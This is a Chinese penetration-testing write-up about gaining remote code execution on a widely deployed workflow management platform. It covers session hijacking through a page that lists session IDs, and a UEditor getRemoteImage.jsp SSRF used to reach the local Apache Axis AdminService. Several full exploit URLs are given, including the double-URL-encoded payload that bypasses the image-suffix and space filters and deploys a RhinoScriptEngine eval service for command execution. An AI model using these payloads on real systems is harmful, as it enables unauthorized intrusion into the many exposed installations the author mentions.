### 某通用流程化管控平台SSRF到RCE之旅

*前言*
====

某一天7iny好兄弟找到一套源代码(安装包)，看了一下不少问题。就从这套系统代码开始渗透吧。看了一下fofa,有一千多个。  
![img](https://shs3.b.qianxin.com/butian_public/f402ff9b217b16298ad2eb229a06b56c4.jpg)

### step1

收到源码后发现几个有意思的功能：

1、`/manage/index.jsp`直接列举出来了所有当前的`sessionID`。  
有了session，我们只需要找到在线的session然后替换我们当前的seesionID可既可以登录当前系统

![img](https://shs3.b.qianxin.com/butian_public/fdb72f2c476e5a01007de407e9d0de8ae.jpg)  
好家伙。这么多用户，我们可以登录去用户系统了。打了渗透的大门。

![img](https://shs3.b.qianxin.com/butian_public/f6d284cff88c877a8b37f3c85585b0989.jpg)

2、进去后发现还有个路径`/mobile/phone/main.jsp`就是手机端的主页面  
![img](https://shs3.b.qianxin.com/butian_public/f005089ccfb884a683bc3e4dd69e1a87c.jpg)  
还有一些报表的页面，  
![img](https://shs3.b.qianxin.com/butian_public/ff5d1c8f6182e5c8015e176fad59fe8bb.jpg)  
进去后很可惜发现没有可RCE的点。

### step2

1. 发现了一个AXIS服务。  
    ![img](https://shs3.b.qianxin.com/butian_public/f99356c688a37b2acf5c91c5b2565f343.jpg)  
    axis&lt;=1.4版本存在RCE，尝试使用已知payload打一下，毫无意外的remote user access is not allowed.

![img](https://shs3.b.qianxin.com/butian_public/fd5cdd93398b951ae326eea3b9c2c05cf.jpg)  
也就是说只需要找到一个SSRF，本地调用即可。  
7iny帮我找到一个利用点，`/common/ueditor1_3_5-utf8/` 发现一个ueditor

![img](https://shs3.b.qianxin.com/butian_public/f540ce390747d20c5ce15f78bc3dc7d87.jpg)

这个编辑器存在一个SSRF。  
`/common/ueditor1_3_5-utf8/jsp/getRemoteImage.jsp?upfile=`  
使用AXIS的get型payload尝试一下，发现图片类型不正确。  
![img](https://shs3.b.qianxin.com/butian_public/f25735594caba80ad3999acfb9a6761e3.jpg)

### step3

知道是AXIS,有`getRemoteImage.jsp`的源码，本地搭建一个环境来debug,开启debug模式`./catalina.sh jpda start`

#### *第一次尝试(先盲猜一下)*：

既然是需要结尾需要一个.jpg。我们在URL后直接加.jpg结尾。也就是：&amp;xx=xx.jpg

```php
http://127.0.0.1:8080/axis/services/AdminService?method=!--%3E%3Cdeployment%20x mlns%3D%22http%3A%2F%2Fx ml.apache.org%2Faxis%2Fwsdd%2F%22%20x mlns%3Ajava%3D%22http%3A%2F%2Fx ml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22ServiceFactoryService%22%20provider%3D%22java%3ARPC%22%3E%3Cparameter%20name%3D%22className%22%20value%3D%22org.apache.axis.client.ServiceFactory%22%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22*%22%2F%3E%3C%2Fservice%3E%3C%2Fdeployment&xx=xx.jpg
```

发现还是被ban。还是提示图片类型不正确。预料之中。

##### *第二次尝试*：

看一下remote.jsp的源码。很简单，就是远程下载一个图片，依次遍历每个参数，并且判断是不是以".gif" , ".png" , ".jpg" , ".jpeg" , ".bmp"这些结尾。如果不是图片或者不正确则报错。

![img](https://shs3.b.qianxin.com/butian_public/f266e8f3ecd7624cc3fca45ce020f2212.jpg)

![img](https://shs3.b.qianxin.com/butian_public/fed2e17c8c334be7c3a28302d8522fb1a.jpg)  
现在尝试一下，直接接一个.jpg。看一下是不是爆出"请求地址头不正确"，这个我们预期的结果。

```php
http://127.0.0.1:8080/axis/services/AdminService?method=!--%3E%3Cdeployment%20x mlns%3D%22http%3A%2F%2Fx ml.apache.org%2Faxis%2Fwsdd%2F%22%20x mlns%3Ajava%3D%22http%3A%2F%2Fx ml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22ServiceFactoryService%22%20provider%3D%22java%3ARPC%22%3E%3Cparameter%20name%3D%22className%22%20value%3D%22org.apache.axis.client.ServiceFactory%22%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22*%22%2F%3E%3C%2Fservice%3E%3C%2Fdeployment.jpg
```

![img](https://shs3.b.qianxin.com/butian_public/feca46c949263eaa56263d0e919f0f51e.jpg)  
遗憾的是并不是预期的结果，而是报了一个空指针，事实上，看remote.jsp的代码是不会有空指针爆出来，那就只能是框架爆出来的，既然是框架一般而言是有不合法的字符出现会出现此类的情况。  
最后发现是%20,不能有空格，因为提交的是x ml格式的数据，里面的空格用来做字符的分割，既然不能有空格，那我们直接用换行%0d%0a，试试看是否可以。

```php
http://localhost:8080/remote.jsp?upfile=http://127.0.0.1:8080/axis/services/AdminService?method=!--%3E%3Cdeploymenta%0d%0axxx
```

发现还是空指针。后面通过尝试，只有%0d可以，%0a不行。是不是真的能否作为x ml的分隔符现在还不知道。![img](https://shs3.b.qianxin.com/butian_public/f0b9b1b82b6b87ee1cb5dd56dca2159be.jpg)

##### *第三次尝试：*

开始绕过图片为结尾的后缀，在get类型的payload中，发现开头有一个!--&gt;，debug一下跟到代码处，发现是为了做一个拼合。  
![img](https://shs3.b.qianxin.com/butian_public/f8b55e18383470153c9008ef9d8ee4c89.jpg)  
代码如下：  
![img](https://shs3.b.qianxin.com/butian_public/f899237a1a5c28cc4c7351ddf3a5387ca.jpg)  
最终拼接后为：  
![img](https://shs3.b.qianxin.com/butian_public/f6a1d8c72f54def8da82d8a008af5b0ba.jpg)  
刚好把第一个payload注释，第二个生效。现在我们只需要做填空题。在结尾拼接就行`<xxx.jpg></xxx.jpg`即可，当然结尾的&gt;会给我们自动闭合，刚好以.jpg结尾，所以新的payload如下：  
所以我们只需要在结尾加上`><xx.jpg></xx.jpg` 即可  
![img](https://shs3.b.qianxin.com/butian_public/fa00e03e67f090745c254742de0726e0e.jpg)

使用%0d，以及我们拼接的xx.jpg payload来提交，debug后发现%0d后的东西丢了

```php
http://localhost:8080/remote.jsp?upfile=http://localhost:8080/axis/services/AdminService?method=!--%3E%3Cdeployment%0dx mlns%3D%22http%3A%2F%2Fx ml.apache.org%2Faxis%2Fwsdd%2F%22%0dx mlns%3Ajava%3D%22http%3A%2F%2Fx ml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%0dname%3D%22m00gege%22%0dprovider%3D%22java%3ARPC%22%3E%3Cparameter%0dname%3D%22className%22%0dvalue%3D%22com.sun.s cript.j avas cript.Rhinos criptEngine%22%0d%2F%3E%3Cparameter%0dname%3D%22allowedMethods%22%0dvalue%3D%22e val%22%0d%2F%3E%3CtypeMapping%0ddeserializer%3D%22org.apache.axis.encoding.ser.BeanDeserializerFactory%22%0dtype%3D%22java%3Ajavax.s cript.Simples criptContext%22%0dqname%3D%22ns%3ASimples criptContext%22%0dserializer%3D%22org.apache.axis.encoding.ser.BeanSerializerFactory%22%0dx mlns%3Ans%3D%22urn%3Abeanservice%22%0dregenerateElement%3D%22false%22%3E%3C%2FtypeMapping%3E%3C%2Fservice%3E%3C%2Fdeployment%3E%3Cxx.jpg%3E%3C/xx.jpg
```

访问  
![img](https://shs3.b.qianxin.com/butian_public/f1fc8812d296582f71f099bd4e4f98e20.jpg)

##### *第四次尝试：*

咋办??  
![img](https://shs3.b.qianxin.com/butian_public/f000ea486d4ce27b178a548862e87ceff.jpg)  
最后灵机一动，试一下urlencode双重编码,成功了。

```php
http://localhost:8080/remote.jsp?upfile=http://127.0.0.1:8080/axis/services/AdminService?method=!--%253E%253Cdeployment%250dx mlns%253D%2522http%253A%252F%252Fx ml.apache.org%252Faxis%252Fwsdd%252F%2522%250dx mlns%253Ajava%253D%2522http%253A%252F%252Fx ml.apache.org%252Faxis%252Fwsdd%252Fproviders%252Fjava%2522%253E%253Cservice%250dname%253D%2522mxxgege%2522%250dprovider%253D%2522java%253ARPC%2522%253E%253Cparameter%250dname%253D%2522className%2522%250dvalue%253D%2522com.sun.s cript.j avas cript.Rhinos criptEngine%2522%250d%252F%253E%253Cparameter%250dname%253D%2522allowedMethods%2522%250dvalue%253D%2522e val%2522%250d%252F%253E%253CtypeMapping%250ddeserializer%253D%2522org.apache.axis.encoding.ser.BeanDeserializerFactory%2522%250dtype%253D%2522java%253Ajavax.s cript.Simples criptContext%2522%250dqname%253D%2522ns%253ASimples criptContext%2522%250dserializer%253D%2522org.apache.axis.encoding.ser.BeanSerializerFactory%2522%250dx mlns%253Ans%253D%2522urn%253Abeanservice%2522%250dregenerateElement%253D%2522false%2522%253E%253C%252FtypeMapping%253E%253C%252Fservice%253E%253C%252Fdeployment%253E%253Cxx.jpg%253E%253C%2Fxx.jpg

```

成功了，出现了我们预期的效果。  
![img](https://shs3.b.qianxin.com/butian_public/f426a60b0dea5349e0fe92f86820d58c5.jpg)  
成功注册服务  
![img](https://shs3.b.qianxin.com/butian_public/f417351c04962c527aae7cb8cd92761c6.jpg)

##### *第五次尝试：*

接下来，直接访问我们部署的服务即可。执行whoami。  
![img](https://shs3.b.qianxin.com/butian_public/f168d4022b4510631ae995647dc55ba51.jpg)

### *总结*

觉得这个漏洞可以作为CTF来出，挺有意思的一个漏洞，关键点，.jpg绕过，%20处理。